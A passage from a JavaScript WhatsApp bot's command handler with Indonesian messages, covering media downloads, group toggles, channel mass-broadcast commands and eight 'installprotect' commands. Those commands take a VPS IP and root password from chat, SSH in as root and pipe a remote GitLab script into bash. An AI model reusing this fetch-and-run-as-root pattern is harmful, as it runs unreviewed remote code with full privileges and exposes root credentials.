 caption: `🎶 *PLAY RESULT*\n\n📌 *Title:* ${meta.title}\n👤 *Author:* ${meta.author?.name || "Unknown"}\n⏱️ *Duration:* ${meta.duration?.timestamp || "?"}\n👁️ *Views:* ${meta.views || "?"}\n📅 *Uploaded:* ${meta.ago || "?"}\n\n🔗 [YouTube](${meta.url})`
 },
 { quoted: m }
 )

 // kirim audio streaming (tanpa buffer ke disk)
 await conn.sendMessage(
 m.chat,
 {
 audio: { url: down.url },
 mimetype: "audio/mpeg",
 ptt: false,
 fileName: down.filename || `${meta.title}.mp3`
 },
 { quoted: m }
 )

 } catch (e) {
 console.error(e)
 Reply("⚠️ Terjadi error saat memproses permintaan.")
 }

 await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
}
break

//=============================================//

case "playvid": {
 if (!text) return m.reply(example("dj tiktok"))
 await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } })

 try {
 // Fetch API Video
 let anu = await fetchJson(`https://api.vreden.my.id/api/v1/download/play/video?query=${encodeURIComponent(text)}`)

 if (!anu || !anu.status || !anu.result || !anu.result.download) {
 return m.reply("❌ Error! Video tidak ditemukan.")
 }

 let meta = anu.result.metadata
 let down = anu.result.download

 // Kirim Thumbnail + Info Video
 await conn.sendMessage(
 m.chat,
 {
 image: { url: meta.image },
 caption: `🎬 *VIDEO RESULT*\n\n📌 *Title:* ${meta.title}\n👤 *Author:* ${meta.author?.name || "Unknown"}\n⏱️ *Duration:* ${meta.duration?.timestamp || "?"}\n👁️ *Views:* ${meta.views || "?"}\n📅 *Uploaded:* ${meta.ago || "?"}\n\n🔗 [YouTube](${meta.url})`
 },
 { quoted: m }
 )

 // Kirim Video
 await conn.sendMessage(
 m.chat,
 {
 video: { url: down.url },
 mimetype: "video/mp4",
 fileName: down.filename || "video.mp4",
 caption: `✅ Video berhasil diunduh (${down.quality || "360p"})`
 },
 { quoted: m }
 )

 } catch (e) {
 console.error(e)
 m.reply("⚠️ Terjadi error saat memproses permintaan.")
 }

 await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
}
break

//=============================================//

case "antikataunchek": {
  if (!isCreator) return m.reply(mess.owner)
  if (!m.isGroup) return m.reply(mess.group)
  if (!text) return m.reply(`*Contoh penggunaan :*\nketik ${cmd} on/off`)

  const isAntikataunchek = Antikataunchek.includes(m.chat)

  if (text == "on") {
    if (isAntikataunchek) return m.reply(`Antikataunchek di grup ini sudah aktif!`)
    Antikataunchek.push(m.chat)
    await fs.writeFileSync("./Data/antikataunchek.json", JSON.stringify(Antikataunchek, null, 2))
    return m.reply(`Antikataunchek berhasil diaktifkan ✅`)
  }

  if (text == "off") {
    if (!isAntikataunchek) return m.reply(`Antikataunchek di grup ini sudah tidak aktif!`)
    const posisi = Antikataunchek.indexOf(m.chat)
    Antikataunchek.splice(posisi, 1)
    await fs.writeFileSync("./Data/antikataunchek.json", JSON.stringify(Antikataunchek, null, 2))
    return m.reply(`Antikataunchek berhasil dimatikan ✅`)
  }
}
break

//=============================================//

case "antikatach": {
    const status = loadStatus();

    if (!args || args.length === 0) {
        return m.reply("Gunakan: .antikatach on/off");
    }

    const cmd = args[0].toLowerCase();

    if (cmd === "on") {
        status.antikatach = true;
        saveStatus(status);
        m.reply("✅ Anti Kata Terlarang telah *ON*");
    } else if (cmd === "off") {
        status.antikatach = false;
        saveStatus(status);
        m.reply("❌ Anti Kata Terlarang telah *OFF*");
    } else {
        m.reply("Gunakan: .antikatach on/off");
    }
    break;
}

//=============================================//

case "iqc": {
 try {
 if (!text) {
 return Reply('Format salah! Gunakan: .iqc jam|batre|pesan\nContoh: .iqc 18:00|40|hai hai');
 }

 const parts = text.split('|');
 if (parts.length < 3) {
 return Reply('Format salah! Gunakan:\n.iqc jam|batre|pesan\nContoh:\n.iqc 18:00|40|hai hai');
 }

 const [time, battery, ...messageParts] = parts;
 const message = messageParts.join('|').trim();

 if (!time || !battery || !message) {
 return Reply('Format tidak lengkap! Pastikan mengisi jam, batre, dan pesan');
 }

 await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

 const encodedTime = encodeURIComponent(time);
 const encodedMessage = encodeURIComponent(message);
 const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodedTime}&batteryPercentage=${battery}&carrierName=INDOSAT&messageText=${encodedMessage}&emojiStyle=apple`;

 const axios = require('axios');
 const response = await axios.get(url, { responseType: 'arraybuffer' });

 if (!response.data) {
 throw new Error('Gagal mendapatkan gambar dari server');
 }

 await conn.sendMessage(m.chat, {
 image: Buffer.from(response.data),
 caption: '✅ Pesan iPhone quote berhasil dibuat.'
 }, { quoted: m });

 await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

 } catch (error) {
 console.error('Error di iqc:', error);
 Reply(`❌ Error: ${error.message || 'Terjadi kesalahan saat memproses'}`);
 }
}
break

//=============================================//

case "antilinkch": {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
if (!text) return m.reply(`*Contoh penggunaan :*
ketik ${cmd} on/off`)
const isAntilinkch = Antilinkch.includes(m.chat)
if (text == "on") {
if (isAntilinkch) return m.reply(`Antilinkch di grup ini sudah aktif!`)
Antilinkch.push(m.chat)
await fs.writeFileSync("./Data/antilinkch.json", JSON.stringify(Antilinkch, null, 2))
return m.reply(`Antilinkch berhasil diaktifkan ✅`)
}
if (text == "off") {
if (!isAntilinkch) return m.reply(`Antilinkch di grup ini sudah tidak aktif!`)
 const posisi = Antilinkch.indexOf(m.chat)
Antilinkch.splice(posisi, 1)
await fs.writeFileSync("./Data/antilinkch.json", JSON.stringify(Antilinkch, null, 2))
return m.reply(`Antilinkch berhasil dimatikan ✅`)
}
}
break

//=============================================//

case "jpmchnew": {
  if (!isCreator && !isJasherVIP) return Reply(mess.owner);
  const fs = require("fs");
  const setting = JSON.parse(fs.readFileSync("./library/database/setbot.json", "utf8"));
  if (!setting.botJpmch) return Reply("❌ Fitur JPMCH sedang nonaktif.");

  if (!text) return Reply("Teksnya?");

  Reply("⏳ Sedang memproses pengiriman ke semua Channel...");

  try {
    const ress = await conn.newsletterFetchAllParticipating();
    const channels = Object.values(ress).filter(v =>
      v.id &&
      v.viewer_metadata &&
      (v.viewer_metadata.role === "ADMIN" || v.viewer_metadata.role === "OWNER")
    ).map(v => v.id);

    if (channels.length < 1) return Reply("❌ Tidak ada Channel di mana bot menjadi admin!");

    let sukses = 0;
    let gagal = 0;

    for (const id of channels) {
      try {
        await conn.sendMessage(id, { text });
        sukses++;
        await sleep(setting.delayJpm || 5000);
      } catch (err) {
        gagal++;
        console.error(`❌ Gagal kirim ke ${id}:`, err);
      }
    }

    Reply(`✅ *JPMCH Selesai!*\n\n📊 *Hasil Pengiriman:*\n🟢 Berhasil: ${sukses}\n🔴 Gagal: ${gagal}\n📢 Total Channel: ${channels.length}`);
  } catch (e) {
    console.error(e);
    Reply("❌ Gagal mendapatkan daftar Channel WhatsApp.");
  }
}
break;

//=============================================//

case "listch": {
  if (!isCreator) return Reply(mess.owner);

  Reply("🔎 Sedang memeriksa daftar Channel...");

  try {
    const ress = await conn.newsletterFetchAllParticipating();

    const semua = Object.values(ress);
    const adminOwner = semua.filter(v =>
      v.id &&
      v.viewer_metadata &&
      (v.viewer_metadata.role === "ADMIN" || v.viewer_metadata.role === "OWNER")
    );

    if (adminOwner.length < 1) return Reply("❌ Tidak ada Channel di mana bot menjadi admin atau owner.");

    // Format daftar hasil
    let teks = `📢 *Daftar Channel di mana Bot adalah Admin/Owner*\n\n`;
    let no = 1;
    for (const ch of adminOwner) {
      teks += `${no++}. ${ch.name || 'Tanpa Nama'}\n🆔 ${ch.id}\n👑 Role: ${ch.viewer_metadata.role}\n\n`;
    }

    teks += `📊 *Total Channel Terdaftar:* ${semua.length}\n🟢 *Admin/Owner:* ${adminOwner.length}\n🔴 *Dibuang:* ${semua.length - adminOwner.length}`;

    Reply(teks);
  } catch (e) {
    console.error(e);
    Reply("❌ Gagal mendapatkan daftar Channel WhatsApp.");
  }
}
break;

// FITUR KHUSUS OPEN JASHER DLL
// DI ATAS JUGA ADA TAPI FULL NO CD
// JADI DI BAWAH FULL KHUSUS

//KHUSUS OWN JS JADI PAKE CD
//ADDOWNJS NYA .addownjs
case "jpmch": {
  if (!isCreator && !isJasher) return m.reply(mess.owner);

  const fs = require("fs");
  const setting = JSON.parse(fs.readFileSync('./library/database/setbot.json','utf8'));

  if (!setting.botJpmch) return m.reply("❌ Fitur JPMCH sedang nonaktif.");

  // ====== CEK LOCK PALING AWAL ======
  if (global.jpmchLock === true) {
    return m.reply("❌ *Fitur ini sedang digunakan oleh Owner/Jasher lain.*\n🙏 Mohon tunggu sampai proses selesai.");
  }

  // ====== CEK TEKS & MEDIA ======
  if (!text && !m.quoted) return m.reply(`
❗ Hai sayang! Sepertinya kamu belum mengirim teks atau media.  

📌 Cara pakai:  
1️⃣ Ketik .jpmch diikuti teks yang ingin dikirim ke semua saluran.  
2️⃣ Atau reply foto/video dengan .jpmch untuk kirim media + teks.  

Contoh:  
- .jpmch Halo semua!  
- Reply foto dengan .jpmch 🎉
  `);

  // ====== CEK COOLDOWN ======
  const cooldownTime = (Number(global.cd) || 600) * 1000;
  const now = Date.now();
  if (!global.lastJpmchTextTime) global.lastJpmchTextTime = 0;

  const timePassed = now - global.lastJpmchTextTime;
  const remaining = cooldownTime - timePassed;

  if (remaining > 0) {
    const detik = Math.ceil(remaining / 1000);
    return m.reply(`⏳ Fitur ini sedang cooldown.\nTunggu *${detik} detik* lagi.`);
  }

  // ====== SET LOCK ======
  global.jpmchLock = true;

  // ====== CEK KATA TERLARANG ======
  let antiKata = [];
  try {
    antiKata = JSON.parse(fs.readFileSync('./library/database/antikata.json', 'utf8'));
  } catch {
    antiKata = ["suntik", "vercel", "premium"];
  }

  const lowerText = text ? text.toLowerCase() : "";
  const ditemukan = antiKata.find(kata => lowerText.includes(kata.toLowerCase()));

  if (ditemukan) {
    global.jpmchLock = false; // LEPAS LOCK
    return m.reply(`🚫 Pesan tidak diizinkan dikirim.\nKata terlarang terdeteksi: *${ditemukan}*`);
  }

  // ====== BACA ID SALURAN ======
  let daftarSaluran;
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json','utf8'));
  } catch (e) {
    global.jpmchLock = false;
    console.error(e);
    return m.reply("❌ Gagal baca file idsaluran.json");
  }

  m.reply(`
╭── ✦ 𝗞𝗶𝗿𝗶𝗺 𝗣𝗲𝘀𝗮𝗻 ✦ ──╮
│ 🕐 Status : *Mengirim pesan...*
│ 🚀 Kirim ke : *${daftarSaluran.length} saluran*
│ ⏳ Proses : *Jpmch teks/media*
│ 🗣️ Owner : *Al Luffy Official*
╰──────────────╯
© AL LUFFY OFFICIAL
  `);

  // ====== PROSES KIRIM ======
  for (const id of daftarSaluran) {
    try {
      if (m.quoted) {
        // Ada media
        const mime = m.quoted.mimetype || "";
        let buffer = await m.quoted.download();
        if (/image/.test(mime)) {
          await conn.sendMessage(id, { image: buffer, caption: text || "" });
        } else if (/video/.test(mime)) {
          await conn.sendMessage(id, { video: buffer, caption: text || "" });
        } else {
          await conn.sendMessage(id, { document: buffer, mimetype: mime, fileName: "file" });
        }
      } else if (text) {
        // Hanya teks
        await conn.sendMessage(id, { text });
      }

      await sleep(setting.delayJpm || 5000);
    } catch (err) {
      console.error(`❌ Gagal kirim ke ${id}:`, err);
    }
  }

  // ====== SET COOLDOWN ======
  global.lastJpmchTextTime = Date.now();

  // ====== LEPAS LOCK ======
  global.jpmchLock = false;

  m.reply(`
╭──✦ 𝗣𝗲𝘀𝗮𝗻 𝗧𝗲𝗿𝗸𝗶𝗿𝗶𝗺 ✦──╮
│ ✅ Terkirim : *${daftarSaluran.length} saluran*
│ 🌈 Status : *Berhasil*
│ 🔐 Proses : *Jpmch teks/media*
│ 🗣️ Owner : *Al Luffy Official*
│ 📩 *Mohon Jeda Sayang❤️*
╰─────────────────╯
© AL LUFFY OFFICIAL
  `);
}
break;

//KHUSUS PT JS JADI PAKE ANTRI
//ADDPTJS NYA .addptjs
case "jpmchpt": {
  if (!isCreator && !isJasherVIP) return m.reply(mess.owner);

  const fs = require('fs');
  const setting = JSON.parse(fs.readFileSync('./library/database/setbot.json', 'utf8'));

  if (!setting.botJpmch) return m.reply("❌ Fitur JPMCH sedang nonaktif.");

  // cek teks atau media
  if (!text && !m.quoted) return m.reply(`
❗ Hai sayang! Sepertinya kamu belum mengirim teks atau media.  

📌 Cara pakai:  
1️⃣ Ketik .jpmchpt diikuti teks yang ingin dikirim ke semua saluran.  
2️⃣ Atau reply foto/video dengan .jpmchpt untuk kirim media + teks.  

Contoh:  
- .jpmchpt Halo semua!  
- Reply foto/video dengan .jpmchpt 🎉
  `);

  // === baca daftar kata terlarang ===
  let antiKata = [];
  try {
    antiKata = JSON.parse(fs.readFileSync('./library/database/antikata.json', 'utf8'));
  } catch {
    antiKata = ["suntik", "vercel", "premium"]; // default
  }

  const lowerText = text ? text.toLowerCase() : "";
  const ditemukan = antiKata.find(kata => lowerText.includes(kata.toLowerCase()));

  if (ditemukan) {
    return m.reply(`🚫 Pesan tidak diizinkan dikirim.\nKata terlarang terdeteksi: *${ditemukan}*`);
  }

  // cek apakah sedang dipakai user lain
  if (global.jpmchQueue) {
    return m.reply("🚧 Fitur sedang digunakan oleh partner jasher lain.\nMohon tunggu hingga selesai.");
  }

  // kasih tanda sedang dipakai
  global.jpmchQueue = true;

  let daftarSaluran;
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
  } catch (e) {
    console.error(e);
    global.jpmchQueue = false; // reset lock biar gak nge-stuck
    return m.reply("❌ Gagal baca file idsaluran.json");
  }

  // notif awal
  m.reply(`
╭── ✦ 𝗞𝗶𝗿𝗶𝗺 𝗣𝗲𝘀𝗮𝗻 ✦ ──╮
│ 🕐 Status : *Mengirim pesan...*
│ 🚀 Kirim ke : *${daftarSaluran.length} saluran*
│ ⏳ Proses : *Jpmch teks/media*
│ 🗣️ Owner : *Al Luffy Official*
╰──────────────╯
© AL LUFFY OFFICIAL
  `);

  // kirim pesan ke semua saluran
  for (const id of daftarSaluran) {
    try {
      if (m.quoted) {
        // Ada media yang di-reply
        const mime = m.quoted.mimetype || "";
        let buffer = await m.quoted.download();
        if (/image/.test(mime)) {
          await conn.sendMessage(id, { image: buffer, caption: text || "" });
        } else if (/video/.test(mime)) {
          await conn.sendMessage(id, { video: buffer, caption: text || "" });
        } else {
          // media lain dikirim sebagai dokumen
          await conn.sendMessage(id, { document: buffer, mimetype: mime, fileName: "file" });
        }
      } else if (text) {
        // Hanya teks
        await conn.sendMessage(id, { text });
      }

      await sleep(setting.delayJpm || 5000);
    } catch (err) {
      console.error(`❌ Gagal kirim ke ${id}:`, err);
    }
  }

  // notif selesai
  m.reply(`
╭──✦ 𝗣𝗲𝘀𝗮𝗻 𝗧𝗲𝗿𝗸𝗶𝗿𝗶𝗺 ✦──╮
│ ✅ Terkirim : *${daftarSaluran.length} saluran*
│ 🌈 Status   : *Berhasil*
│ 🔐 Proses   : *Jpmch teks/media*
│ 🗣️ Owner    : *Al Luffy Official*
│ 📩 *Mohon Jeda Sayang❤️*
╰─────────────────╯
© AL LUFFY OFFICIAL
  `);

  // selesai → buka lock antrian
  global.jpmchQueue = false;
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 1 By Al Luffy
// ────────────────────────────────
case "installprotect1": {
  if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

  if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*installprotect1 ipvps|pwvps*', m);
  const [ipvps, pwvps] = text.split('|').map(a => a.trim());
  if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*installprotect1 ipvps|pwvps*', m);

  const { Client: SSHClient } = require('ssh2');
  const sshClient = new SSHClient();

  const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect1.sh';

  Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Alluffy Protect 1...`, m);

  sshClient.on('ready', () => {
    Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

    sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
      if (err) {
        sshClient.end();
        return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
      }

      let output = '';

      stream.on('data', (data) => {
        output += data.toString();
      });

      stream.stderr.on('data', (data) => {
        output += `\n[ERROR] ${data.toString()}`;
      });

      stream.on('close', () => {
        sshClient.end();
        const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
        Reply(`✅ *Instalasi Alluffy Protect 1 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
      });
    });
  });

  sshClient.on('error', (err) => {
    Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
  });

  sshClient.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps,
    readyTimeout: 20000
  });
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 2 By Al Luffy
// ────────────────────────────────
case "installprotect2": {
  if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

  if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*installprotect2 ipvps|pwvps*', m);
  const [ipvps, pwvps] = text.split('|').map(a => a.trim());
  if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*installprotect2 ipvps|pwvps*', m);

  const { Client: SSHClient } = require('ssh2');
  const sshClient = new SSHClient();

  const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect2.sh';

  Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Alluffy Protect 2...`, m);

  sshClient.on('ready', () => {
    Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

    sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
      if (err) {
        sshClient.end();
        return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
      }

      let output = '';

      stream.on('data', (data) => {
        output += data.toString();
      });

      stream.stderr.on('data', (data) => {
        output += `\n[ERROR] ${data.toString()}`;
      });

      stream.on('close', () => {
        sshClient.end();
        const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
        Reply(`✅ *Instalasi Alluffy Protect 2 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
      });
    });
  });

  sshClient.on('error', (err) => {
    Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
  });

  sshClient.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps,
    readyTimeout: 20000
  });
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 3 By Al Luffy
// ────────────────────────────────
case "installprotect3": {
  if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

  if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect3 ipvps|pwvps', m);
  const [ipvps, pwvps] = text.split('|').map(a => a.trim());
  if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect3 ipvps|pwvps', m);

  const { Client: SSHClient } = require('ssh2');
  const sshClient = new SSHClient();

  const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect3.sh';

  Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Alluffy Protect 3...`, m);

  sshClient.on('ready', () => {
    Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

    sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {  
      if (err) {  
        sshClient.end();  
        return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);  
      }  

      let output = '';  

      stream.on('data', (data) => {  
        output += data.toString();  
      });  

      stream.stderr.on('data', (data) => {  
        output += `\n[ERROR] ${data.toString()}`;  
      });  

      stream.on('close', () => {  
        sshClient.end();  
        const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';  
        Reply(`✅ *Instalasi Alluffy Protect 3 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);  
      });  
    });  
  });

  sshClient.on('error', (err) => {
    Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
  });

  sshClient.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps,
    readyTimeout: 20000
  });
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 4 By Al Luffy
// ────────────────────────────────
case "installprotect4": {
  if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

  if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect4 ipvps|pwvps', m);
  const [ipvps, pwvps] = text.split('|').map(a => a.trim());
  if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect4 ipvps|pwvps', m);

  const { Client: SSHClient } = require('ssh2');
  const sshClient = new SSHClient();

  const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect4.sh';

  Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Alluffy Protect 4...`, m);

  sshClient.on('ready', () => {
    Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

    sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
      if (err) {
        sshClient.end();
        return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
      }

      let output = '';

      stream.on('data', (data) => {
        output += data.toString();
      });

      stream.stderr.on('data', (data) => {
        output += `\n[ERROR] ${data.toString()}`;
      });

      stream.on('close', () => {
        sshClient.end();
        const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
        Reply(`✅ *Instalasi Alluffy Protect 4 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
      });
    });
  });

  sshClient.on('error', (err) => {
    Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
  });

  sshClient.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps,
    readyTimeout: 20000
  });
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 5 By Al Luffy
// ────────────────────────────────
case "installprotect5": {
  if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

  if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect5 ipvps|pwvps', m);
  const [ipvps, pwvps] = text.split('|').map(a => a.trim());
  if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect5 ipvps|pwvps', m);

  const { Client: SSHClient } = require('ssh2');
  const sshClient = new SSHClient();

  const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect5.sh';

  Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Alluffy Protect 5...`, m);

  sshClient.on('ready', () => {
    Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

    sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
      if (err) {
        sshClient.end();
        return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
      }

      let output = '';

      stream.on('data', (data) => {
        output += data.toString();
      });

      stream.stderr.on('data', (data) => {
        output += `\n[ERROR] ${data.toString()}`;
      });

      stream.on('close', () => {
        sshClient.end();
        const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
        Reply(`✅ *Instalasi Alluffy Protect 5 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
      });
    });
  });

  sshClient.on('error', (err) => {
    Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
  });

  sshClient.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps,
    readyTimeout: 20000
  });
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 6 By Al Luffy
// ────────────────────────────────
case "installprotect6": {
  if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

  if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect6 ipvps|pwvps', m);
  const [ipvps, pwvps] = text.split('|').map(a => a.trim());
  if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect6 ipvps|pwvps', m);

  const { Client: SSHClient } = require('ssh2');
  const sshClient = new SSHClient();

  const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect6.sh';

  Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Alluffy Protect 6...`, m);

  sshClient.on('ready', () => {
    Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

    sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
      if (err) {
        sshClient.end();
        return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
      }

      let output = '';

      stream.on('data', (data) => {
        output += data.toString();
      });

      stream.stderr.on('data', (data) => {
        output += `\n[ERROR] ${data.toString()}`;
      });

      stream.on('close', () => {
        sshClient.end();
        const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
        Reply(`✅ *Instalasi Alluffy Protect 6 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
      });
    });
  });

  sshClient.on('error', (err) => {
    Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
  });

  sshClient.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps,
    readyTimeout: 20000
  });
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 7 By Al Luffy
// ────────────────────────────────
case "installprotect7": {
if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect7 ipvps|pwvps', m);
const [ipvps, pwvps] = text.split('|').map(a => a.trim());
if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect7 ipvps|pwvps', m);

const { Client: SSHClient } = require('ssh2');
const sshClient = new SSHClient();

const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect7.sh';

Reply(`⏳ Menghubungkan ke VPS ${ipvps} dan mulai instalasi Alluffy Protect 7...`, m);

sshClient.on('ready', () => {
Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
if (err) {
sshClient.end();
return Reply(`❌ Gagal mengeksekusi perintah:\n${err.message}`, m);
}

let output = '';

stream.on('data', (data) => {
output += data.toString();
});

stream.stderr.on('data', (data) => {
output += `\n[ERROR] ${data.toString()}`;
});

stream.on('close', () => {
sshClient.end();
const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
Reply(`✅ Instalasi Alluffy Protect 7 selesai!\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
});
});
});

sshClient.on('error', (err) => {
Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n${err.message}`, m);
});

sshClient.connect({
host: ipvps,
port: 22,
username: 'root',
password: pwvps,
readyTimeout: 20000
});
}
break;
// ────────────────────────────────
// 🔹 Case Install Protect 8 By Al Luffy
// ────────────────────────────────
case "installprotect8": {
if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect8 ipvps|pwvps', m);
const [ipvps, pwvps] = text.split('|').map(a => a.trim());
if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\ninstallprotect8 ipvps|pwvps', m);

const { Client: SSHClient } = require('ssh2');
const sshClient = new SSHClient();

const scriptURL = 'https://gitlab.com/alluffyofficial/installprotecpanel/-/raw/main/alluffyprotect8.sh';

Reply(`⏳ Menghubungkan ke VPS ${ipvps} dan mulai instalasi Alluffy Protect 8...`, m);

sshClient.on('ready', () => {
Reply('⚙️ Koneksi SSH berhasil! Proses instalasi sedang berjalan...', m);

sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
if (err) {
sshClient.end();
return Reply(`❌ Gagal mengeksekusi perintah:\n${err.message}`, m);
}

let output = '';

stream.on('data', (data) => {
output += data.toString();
});

stream.stderr.on('data', (data) => {
output += `\n[ERROR] ${data.toString()}`;
});

stream.on('close', () => {
sshClient.end();
const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
